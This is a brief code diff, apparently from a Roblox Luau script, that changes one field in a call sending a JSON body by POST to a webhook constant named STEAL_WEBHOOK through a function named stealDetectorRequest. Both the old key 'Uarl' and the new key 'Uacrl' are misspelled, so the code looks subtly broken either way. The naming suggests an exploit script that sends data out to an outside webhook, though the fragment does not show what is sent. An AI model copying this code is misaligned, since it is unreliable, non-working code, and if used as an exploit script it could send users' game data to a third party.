@@ -17,7 +17,7 @@ local function sendWebhookBody(body)
         pcall(function()
             if typeof(stealDetectorRequest) == "function" then
                 stealDetectorRequest({
-                    Uarl = STEAL_WEBHOOK,
+                    Uacrl = STEAL_WEBHOOK,
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = body
